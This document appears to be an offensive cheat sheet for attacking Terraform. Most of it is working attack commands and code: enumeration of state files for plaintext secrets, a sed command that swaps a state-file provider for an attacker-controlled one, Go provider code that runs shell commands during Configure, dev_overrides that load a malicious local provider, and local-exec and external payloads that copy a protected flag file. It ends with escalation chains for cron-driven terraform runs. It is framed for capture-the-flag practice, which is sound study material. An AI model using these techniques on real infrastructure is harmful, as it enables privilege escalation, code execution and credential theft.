# Terraform

## Fingerprint

```text
terraform.tfstate
terraform.tfstate.backup
.terraform/
.terraform.lock.hcl
*.tf
*.tfvars
TF_DATA_DIR
TF_CLI_CONFIG_FILE
terraform init
terraform apply
```

Terraform state is a JSON inventory of every managed resource and often contains secrets in plaintext.

## Enumerate

```bash
find / -name '*.tfstate*' -o -name '.terraform' -o -name '*.tfvars' 2>/dev/null

terraform version
terraform providers
terraform state list
terraform show
terraform show -json | jq '.values.root_module.resources[]'
```

Look for:

```text
writable state files
shared /tmp state used by cron or another user
provider source addresses
module sources (git, http, local path)
outputs marked sensitive
plaintext passwords, tokens, private keys
```

## State Poisoning

If the state file is writable but the Terraform configuration is not, change the provider recorded in state. On the next `terraform init`, Terraform downloads the replacement provider; a malicious provider runs code during initialization/configuration.

```bash
cp terraform.tfstate terraform.tfstate.bak

# Show the current provider addresses
jq -r '.resources[].provider' terraform.tfstate | sort -u

# Point a resource at an attacker-controlled provider
sed -i 's|registry.terraform.io/hashicorp/time|registry.terraform.io/attacker/statefile-rce|g' \
  terraform.tfstate

# Verify the edit
jq -r '.resources[].provider' terraform.tfstate | sort -u
```

A public malicious provider can execute code in `Init` or `Configure`:

```go
func (p *Provider) Configure(ctx context.Context, req provider.ConfigureRequest, resp *provider.ConfigureResponse) {
    exec.Command("/bin/sh", "-c", "cp /home/tfuser/flag /tmp/flag; chmod 644 /tmp/flag").Run()
}
```

The classic CTF setup is a cron job:

```text
* * * * * cd /tmp && terraform init && terraform apply -auto-approve
```

The state file is writable, the cron job runs as a more privileged user, and the flag is readable only by that user.

## Provider Overrides

If you can write Terraform CLI config, use `dev_overrides` to load a local provider binary without the registry:

```hcl
# ~/.terraformrc or $TF_CLI_CONFIG_FILE
provider_installation {
  dev_overrides {
    "attacker/statefile-rce" = "/tmp/provider"
  }
  direct {}
}
```

```bash
TF_CLI_CONFIG_FILE=/tmp/terraformrc terraform init
TF_CLI_CONFIG_FILE=/tmp/terraformrc terraform apply
```

Provider binaries are named like:

```text
terraform-provider-statefile-rce_v1.0.0
```

## Configuration Execution

If `.tf` files are writable, the direct paths are:

```hcl
resource "null_resource" "pwn" {
  provisioner "local-exec" {
    command = "cp /home/tfuser/flag /tmp/flag; chmod 644 /tmp/flag"
  }
}

data "external" "pwn" {
  program = ["/bin/sh", "-c", "cp /home/tfuser/flag /tmp/flag; echo '{}'"]
}
```

`local-exec` runs on the machine executing Terraform. `remote-exec` runs over SSH/WinRM. A malicious module or provider can do the same without touching the visible configuration.

## State Backends

```bash
# Local backend
ls -la .terraform/terraform.tfstate

# S3 backend
aws s3 ls s3://BUCKET/PREFIX/
aws s3 cp s3://BUCKET/PREFIX/terraform.tfstate .

# Terraform Cloud / remote backend
cat .terraform/terraform.tfstate
```

Remote state may be readable with cloud credentials. Check versioning for old state containing credentials that were later rotated.

## CTF Chains

```text
Writable shared tfstate -> swap provider -> cron terraform init/apply -> RCE as privileged user
Writable .tf -> local-exec -> read protected file
Leaked cloud creds -> remote state bucket -> secrets in outputs
Malicious module source -> terraform init -> code execution
```

## References

* [Terraform state](https://developer.hashicorp.com/terraform/language/state)
* [Terraform provider installation](https://developer.hashicorp.com/terraform/cli/config/config-file)
* [HackTricks Terraform](https://book.hacktricks.wiki/en/pentesting-cloud/terraform-security/index.html)
* [terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
